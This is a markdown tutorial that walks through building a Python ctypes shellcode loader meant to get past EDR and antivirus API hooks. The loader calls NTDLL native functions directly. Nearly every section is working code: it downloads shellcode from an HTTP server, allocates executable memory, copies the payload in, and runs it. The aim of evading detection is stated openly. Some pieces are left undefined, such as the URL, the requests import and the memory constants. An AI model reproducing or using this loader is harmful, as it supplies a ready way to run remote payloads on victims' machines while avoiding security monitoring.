# Native API Calls

Endpoint Detection and Response (EDR) and Anti-Virus (AV) solutions often use API hooking to collect telemetry data when analyzing whether an application's behavior is potentially malicious. One way to bypass such detection mechanisms is to use lower-level API calls that may not be hooked by these security solutions.

In Windows, API calls from user-space are often translated into lower-level system calls via the _NTDLL.dll_ library. These calls are generally undocumented and may change across Windows versions.

## References

- [Windows Native API - Wikipedia](https://en.wikipedia.org/wiki/Windows_Native_API)
- [Windows Memory Protection Constants](https://learn.microsoft.com/en-us/windows/win32/memory/memory-protection-constants)
- [NtAllocateVirtualMemory Documentation](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntallocatevirtualmemory)
- [NtProtectVirtualMemory Reference](https://github.com/m417z/ntdoc/blob/main/descriptions/ntprotectvirtualmemory.md)
- [RtlCopyMemory Documentation](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlcopymemory)
- [CFUNCTYPE Documentation](https://docs.python.org/3/library/ctypes.html#ctypes.CFUNCTYPE)


## Building the Script

We will use the `NtAllocateVirtualMemory` function from the _NTDLL_ library. This function allows for the allocation of memory in a process’s virtual address space, and we will also use `NtProtectVirtualMemory` to update the memory protection later. The script will fetch the shellcode from an HTTP server, allocate memory, copy the shellcode into the allocated memory, update memory protection, and finally execute the shellcode.

To start, we import the necessary modules from the `ctypes` library, which allows us to interact with Windows APIs at a low level.

```python
from ctypes import *
from ctypes import wintypes
```

Next, we define the argument types the functions expect.

```python
NtAllocateVirtualMemory = windll.ntdll.NtAllocateVirtualMemory
NtAllocateVirtualMemory.argtypes = (
    wintypes.HANDLE, POINTER(wintypes.LPVOID),
    wintypes.ULONG, POINTER(wintypes.ULONG),
    wintypes.ULONG, wintypes.ULONG
)
NtAllocateVirtualMemory.restype = NTSTATUS

NtProtectVirtualMemory = windll.ntdll.NtProtectVirtualMemory
NtProtectVirtualMemory.argtypes = (
    wintypes.HANDLE, POINTER(wintypes.LPVOID),
    POINTER(wintypes.ULONG), wintypes.ULONG,
    POINTER(wintypes.ULONG)
)
NtProtectVirtualMemory.restype = NTSTATUS
```

- `argtypes`: Defines the expected types for the function's arguments.
- `restype`: Specifies the return type for the functions (`NTSTATUS` for both functions).

<br>

Now, we fetch the shellcode from the HTTP server.

```python
print("Fetching shellcode from server...")

response = requests.get(URL)
shellcode = response.content
shellcode_length = len(shellcode)

print(f"Shellcode fetched: {shellcode_length} bytes.")
```

Here, we send a GET request to the server to fetch the shellcode. The shellcode is then stored in the `shellcode` variable, and we print out its length.

<br>

We then define the memory allocation parameters and use `NtAllocateVirtualMemory` to allocate memory for the shellcode. The memory size is rounded up to the nearest page size.

```python
ProcessHandle = 0xffffffffffffffff
BaseAddress = wintypes.LPVOID(0x0)
ZeroBits = wintypes.ULONG(0)

PAGE_SIZE = 4096
RegionSize = wintypes.ULONG((shellcode_length + PAGE_SIZE - 1) // PAGE_SIZE * PAGE_SIZE)
AllocationType = MEM_COMMIT | MEM_RESERVE

res = NtAllocateVirtualMemory(
    ProcessHandle,
    byref(BaseAddress),
    ZeroBits,
    byref(RegionSize),
    AllocationType,
    PAGE_EXECUTE_READ_WRITE
)

if res != 0:
    raise RuntimeError(f"NtAllocateVirtualMemory failed. Status code -> {res}")

print(f"Memory allocated at -> {hex(BaseAddress.value)}")
```

The memory is allocated with `MEM_COMMIT | MEM_RESERVE` flags and a `PAGE_EXECUTE_READ_WRITE` protection. The allocated memory is printed.

<br>

Next, we copy the shellcode into the allocated memory using `RtlCopyMemory`.

```python
shellcode_ptr = (c_char * shellcode_length).from_buffer_copy(shellcode)
RtlCopyMemory = windll.ntdll.RtlCopyMemory
RtlCopyMemory.argtypes = (wintypes.LPVOID, wintypes.LPCVOID, SIZE_T)
RtlCopyMemory.restype = None

RtlCopyMemory(
    BaseAddress,
    shellcode_ptr,
    shellcode_length
)

print("Shellcode copied to allocated memory.")
```

We then update the memory protection to `PAGE_EXECUTE_READ_WRITE` using `NtProtectVirtualMemory`.

```python
NewProtect = PAGE_EXECUTE_READ_WRITE
OldProtect = wintypes.ULONG(0)

res = NtProtectVirtualMemory(
    ProcessHandle,
    byref(BaseAddress),
    byref(RegionSize),
    NewProtect,
    byref(OldProtect)
)

if res != 0:
    raise RuntimeError(f"NtProtectVirtualMemory failed. Status code -> {res}")

print("Memory protection updated to PAGE_EXECUTE_READ_WRITE.")
```

The protection is updated to allow execution of the shellcode. This step is crucial for allowing the shellcode to execute from memory.


Finally, we define the shellcode function type and cast the allocated memory address to a callable function.

```python
shellcode_func = CFUNCTYPE(None)
shellcode_callable = cast(BaseAddress, shellcode_func)

print("Executing shellcode...")
shellcode_callable()
```

The `shellcode_func` type is defined as a function that takes no arguments and returns nothing. We cast the allocated memory address (`BaseAddress`) to this function type and then call the function to execute the shellcode.


## Example Output

![ss_demo](https://github.com/user-attachments/assets/ad8ac741-7c5a-4b15-bf29-6aae41cda892)
